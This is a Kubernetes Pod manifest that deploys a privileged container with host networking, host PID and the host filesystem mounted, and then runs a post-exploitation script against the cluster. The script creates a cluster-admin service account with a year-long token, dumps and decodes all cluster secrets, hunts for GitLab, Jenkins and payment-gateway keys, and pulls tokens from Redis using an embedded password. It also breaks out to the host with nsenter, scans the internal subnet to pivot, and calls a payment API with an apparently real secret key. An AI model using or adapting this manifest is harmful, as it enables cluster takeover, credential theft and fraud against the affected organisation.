apiVersion: v1
kind: Pod
metadata:
  name: network-access
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine:3.19
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache util-linux curl jq openssl redis nmap bash > /dev/null 2>&1

        # Installa kubectl NEL CONTAINER
        curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
        chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null

        echo "=========================================="
        echo "=== 1. VERIFY KUBECTL ==="
        echo "=========================================="
        which kubectl
        kubectl version --client 2>&1 | head -2

        echo "=========================================="
        echo "=== 2. CREATE ADMIN SA + TOKEN (from container) ==="
        echo "=========================================="
        export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
        kubectl create serviceaccount admin-sa -n kube-system 2>&1 || true
        kubectl create clusterrolebinding admin-sa-binding --clusterrole=cluster-admin --serviceaccount=kube-system:admin-sa 2>&1 || true
        echo "=== ADMIN TOKEN (save this!) ==="
        kubectl create token admin-sa -n kube-system --duration=8760h 2>&1 || true

        echo "=========================================="
        echo "=== 3. EXTRACT ALL SECRETS ==="
        echo "=========================================="
        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | head -100 || true

        echo "=========================================="
        echo "=== 4. SEARCH GITLAB/JENKINS/PAGARME ==="
        echo "=========================================="
        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .data | to_entries[] | select(.key | test("gitlab|jenkins|pagar|stripe|cielo|safra|r2d2"; "i")) | .key + "=" + (.value | @base64d)' 2>&1 | head -50 || true

        echo "=========================================="
        echo "=== 5. R2D2 TOKEN (from Redis) ==="
        echo "=========================================="
        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET 'FUbgdflXbu:r2d2.api.token' 2>/dev/null

        echo "=========================================="
        echo "=== 6. HYMPAR TOKEN (from Redis) ==="
        echo "=========================================="
        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET 'FUbgdflXbu:hympar_internal_token' 2>/dev/null

        echo "=========================================="
        echo "=== 7. PIVOT SCAN (with nmap) ==="
        echo "=========================================="
        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
          nmap -sT -p 22,80,443,3306,5432,6379,8080,8443 172.30.0.0/24 2>&1 | grep -E "Nmap scan report|open" | head -50
        ' 2>&1 || true

        echo "=========================================="
        echo "=== 8. GITLAB ACCESS TEST ==="
        echo "=========================================="
        curl -k -s -o /dev/null -w "GitLab HTTP: %{http_code}\n" https://gitlab.dev-gam.com 2>&1 || true
        curl -k -s https://gitlab.dev-gam.com/api/v4/version 2>&1 | head -c 200 || true
        echo ""

        echo "=========================================="
        echo "=== 9. PAGARME API TEST ==="
        echo "=========================================="
        curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 500 || true
        echo ""

        echo "=========================================="
        echo "=== DONE ==="
        echo "=========================================="
        sleep 36000
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
